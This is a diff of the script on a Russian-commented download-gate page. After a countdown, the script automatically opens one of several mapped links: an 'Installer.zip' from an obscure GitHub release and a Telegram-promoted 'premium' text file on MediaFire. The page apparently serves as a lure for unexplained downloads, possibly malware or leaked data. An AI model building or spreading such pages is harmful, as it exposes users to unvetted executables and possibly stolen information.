@@ -77,49 +77,42 @@
     </div>
 
 <script>
-    // ------------------ НАСТРОЙКА ФАЙЛОВ ЗДЕСЬ ------------------
+    // ------------------ СПИСОК ФАЙЛОВ ------------------
     const fileMap = {
-        "premium-txt":      "https://www.mediafire.com/file/7grjnw3i1n1x71a/FOLLOW_TELEGRAM_%40TXT_ALIENS_-_1444.txt/file",
-        "installer":        "https://github.com/charter-fairyu10/turn/releases/download/ex/Installer.zip",
         "1":                "https://github.com/charter-fairyu10/turn/releases/download/ex/Installer.zip",
+        "installer":        "https://github.com/charter-fairyu10/turn/releases/download/ex/Installer.zip",
+        "premium-txt":      "https://www.mediafire.com/file/7grjnw3i1n1x71a/FOLLOW_TELEGRAM_%40TXT_ALIENS_-_1444.txt/file",
         "txt-aliens":       "https://www.mediafire.com/file/7grjnw3i1n1x71a/FOLLOW_TELEGRAM_%40TXT_ALIENS_-_1444.txt/file"
-        // Добавляй новые файлы сюда в формате:
-        // "имя-в-url": "полная-ссылка-для-скачивания",
+        // новые файлы добавляй сюда в формате "ключ": "ссылка",
     };
-    // ------------------------------------------------------------
+    // ----------------------------------------------------
 
-    // Читаем параметр из URL
     const params = new URLSearchParams(window.location.search);
-    const filename = params.get("filename");   // или params.get("file") если хочешь ?file=...
+    const filename = params.get("filename");
 
-    const infoElement    = document.getElementById("filename-info");
-    const errorElement   = document.getElementById("error");
-    const timerElement   = document.querySelector(".timer");
+    const infoElement  = document.getElementById("filename-info");
+    const errorElement = document.getElementById("error");
+    const timerDiv     = document.querySelector(".timer");
 
     let downloadUrl = null;
 
     if (filename && fileMap[filename]) {
         downloadUrl = fileMap[filename];
-        if (infoElement) {
-            infoElement.textContent = "Selected: " + filename;
-        }
-        errorElement.style.display = "none";
+        if (infoElement) infoElement.textContent = "Selected: " + filename;
+        if (errorElement) errorElement.style.display = "none";
     } else {
-        errorElement.textContent = "File not specified or unknown. Use ?filename=premium-txt";
-        errorElement.style.display = "block";
-        if (timerElement) timerElement.style.display = "none";
-        if (infoElement) infoElement.textContent = "Ошибка выбора файла";
-        return; // ← останавливаем таймер и редирект
+        if (errorElement) {
+            errorElement.textContent = "Неизвестный файл. Примеры: ?filename=1 или ?filename=premium-txt";
+            errorElement.style.display = "block";
+        }
+        if (timerDiv) timerDiv.style.display = "none";
+        if (infoElement) infoElement.textContent = "Ошибка";
+        return; // не запускаем таймер
     }
 
-    // Обратный отсчёт и запуск скачивания
+    // Обратный отсчёт
     let countdown = 5;
     const countdownElement = document.getElementById('countdown');
-
-    if (!countdownElement) {
-        console.error("Элемент countdown не найден");
-        return;
-    }
 
     const interval = setInterval(function() {
         countdown--;
@@ -127,9 +120,8 @@
 
         if (countdown <= 0) {
             clearInterval(interval);
-            // Лучший способ для MediaFire — открыть в новой вкладке
-            window.open(downloadUrl, '_blank');
-            // Альтернатива: window.location.href = downloadUrl; (но часто блокируется)
+            window.open(downloadUrl, '_blank');   // новая вкладка — лучше всего работает с MediaFire
+            // Если хочешь редирект в той же вкладке — замени на: window.location.href = downloadUrl;
         }
     }, 1000);
 </script>
